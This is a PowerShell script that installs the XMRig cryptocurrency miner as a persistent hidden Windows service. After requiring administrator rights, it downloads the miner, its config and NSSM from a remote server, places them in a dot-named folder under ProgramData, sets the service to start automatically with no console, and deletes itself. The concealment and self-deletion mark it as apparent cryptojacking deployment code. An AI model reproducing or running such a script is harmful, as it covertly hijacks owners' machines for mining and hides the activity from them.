# Check for Administrator rights
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Please Run as Administrator!" -ForegroundColor Red
    Exit
}
# Check and return current user name
$currentUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
# Paths
$dircheck = "C:\ProgramData\.logstxt"
#$filcheck = "C:\path\to\xmrig.service"  # You might need to adjust this, Windows doesn't have an equivalent to systemd
$filcheck = "C:\Users\$currentUserName\xmrig.exe"
# Removal functions
if (Test-Path $dircheck) {
    Remove-Item -Recurse -Force $dircheck
}
if (Test-Path $filcheck) {
    Remove-Item -Force $filcheck
}

# Download files, I am using ngrok as port forwarding for my containers to FTP server
Invoke-WebRequest -Uri 'https://yourFTPserver/xmrig/config.json' -Headers @{'ngrok-skip-browser-warning'='true'} -OutFile 'config.json'
Invoke-WebRequest -Uri 'https://yourFTPserver/xmrig/xmrig.exe' -Headers @{'ngrok-skip-browser-warning'='true'} -OutFile 'xmrig.exe'
Invoke-WebRequest -Uri 'https://yourFTPserver/xmrig/nssm.exe' -Headers @{'ngrok-skip-browser-warning'='true'} -OutFile 'nssm.exe'

# Create xmrig service file (assuming this has an equivalent in Windows)
# TODO: Check if you need an actual service wrapper like NSSM

# Get thread count (using CPU count as a basic substitute for now)
$threads = (Get-WmiObject -Class Win32_ComputerSystem).NumberOfLogicalProcessors
$tf = [math]::Round(25 * $threads)

# Move and setup files
if (-not (Test-Path $dircheck)) {
    New-Item -ItemType Directory -Path $dircheck
}
Move-Item xmrig.exe $dircheck
Move-Item config.json $dircheck
Move-Item nssm.exe $dircheck
# Move-Item xmrig.service C:\path\to\services\folder  # Adjust path and use only if required

# TODO: Setup as a Windows service (consider tools like NSSM or `sc` command)

#create a nssm command that will make the xmrig.exe run as a service in the background
Set-Location $dircheck
.\nssm install xmrig "C:\ProgramData\.logstxt\xmrig.exe"
.\nssm set xmrig AppDirectory "C:\ProgramData\.logstxt"
.\nssm set xmrig AppParameters "xmrig.exe -B -c config.json" # -B = run the miner in the background

# Start the service
.\nssm start xmrig

#make the xmrig service run on startup
.\nssm set xmrig start SERVICE_AUTO_START

#make the xmrig write in a log file
.\nssm set xmrig AppNoConsole 1

#make the xmrig run in the background
.\nssm set xmrig Type SERVICE_WIN32_OWN_PROCESS



# TODO: Windows doesn't have an equivalent to sysctl or hugepages in the same sense as Linux

# Clean up
Remove-Item $PSCommandPath -Force